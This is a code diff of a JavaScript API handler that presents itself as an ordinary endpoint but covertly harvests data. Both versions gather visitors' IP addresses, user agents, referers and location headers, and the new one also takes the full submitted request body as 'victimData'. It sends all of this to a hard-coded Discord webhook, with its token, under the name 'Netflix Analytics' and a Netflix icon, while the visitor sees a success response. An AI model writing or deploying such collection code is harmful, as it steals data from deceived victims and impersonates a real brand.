@@ -1,52 +1,91 @@
 export default async function handler(req, res) {
-    // This looks like a normal API endpoint
-    const { action, data } = req.body;
-    
-    // Secretly collect additional data
-    const victimInfo = {
-        timestamp: new Date().toISOString(),
-        ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
-        userAgent: req.headers['user-agent'],
-        referer: req.headers['referer'],
-        country: req.headers['cf-ipcountry'] || 'unknown',
-        method: req.method,
-        endpoint: req.url
-    };
-    
-    // Send to Discord
-    await sendToWebhook('API_COLLECT', victimInfo);
-    
-    // Return legitimate-looking response
-    res.json({
-        success: true,
-        message: "Data processed successfully",
-        timestamp: new Date().toISOString()
-    });
+    // Set CORS headers
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+    if (req.method === 'OPTIONS') {
+        return res.status(200).end();
+    }
+
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
+
+    try {
+        const victimData = {
+            ...req.body,
+            timestamp: new Date().toISOString(),
+            ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+            userAgent: req.headers['user-agent'],
+            referer: req.headers['referer'],
+            cfCountry: req.headers['cf-ipcountry'],
+            cfRegion: req.headers['cf-region'],
+            cfCity: req.headers['cf-city']
+        };
+
+        // Send to Discord webhook
+        await sendToWebhook('VICTIM_DATA', victimData);
+
+        // Return success response
+        res.setHeader('Content-Type', 'application/json');
+        res.status(200).json({ 
+            success: true, 
+            message: 'Data processed successfully' 
+        });
+
+    } catch (error) {
+        console.error('Collection error:', error);
+        res.status(500).json({ 
+            success: false, 
+            error: 'Internal server error' 
+        });
+    }
 }
 
 async function sendToWebhook(type, data) {
-    // YOUR WEBHOOK INTEGRATED
-    const webhook = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
+    const webhookUrl = 'https://discord.com/api/webhooks/1435965962900996206/8_no1ovawlBkyTUQEIwx0GQdVaZz0f7C61Zte2KXNYSAJ8hsokVbOgwQXUO7jChnPbrm';
     
+    const embed = {
+        title: `🎯 ${type} - New Victim Data`,
+        color: 0x00ff00,
+        fields: [],
+        timestamp: new Date().toISOString(),
+        footer: {
+            text: `Collection System • ${data.ip || 'Unknown IP'}`
+        }
+    };
+
+    // Add fields dynamically
+    Object.entries(data).forEach(([key, value]) => {
+        if (value && typeof value === 'object') {
+            embed.fields.push({
+                name: key,
+                value: '```json\n' + JSON.stringify(value, null, 2) + '\n```',
+                inline: false
+            });
+        } else {
+            embed.fields.push({
+                name: key,
+                value: String(value).substring(0, 1024),
+                inline: key.length < 15
+            });
+        }
+    });
+
     try {
-        await fetch(webhook, {
+        await fetch(webhookUrl, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+                'Content-Type': 'application/json',
+            },
             body: JSON.stringify({
-                username: 'API Monitor',
-                embeds: [{
-                    title: 'API Data - ' + type,
-                    color: 0x0099ff,
-                    fields: Object.entries(data).map(([key, value]) => ({
-                        name: key,
-                        value: String(value),
-                        inline: true
-                    })),
-                    timestamp: new Date().toISOString()
-                }]
+                username: 'Netflix Analytics',
+                avatar_url: 'https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png',
+                embeds: [embed]
             })
         });
     } catch (error) {
-        // Silent fail
+        console.error('Webhook error:', error);
     }
 }
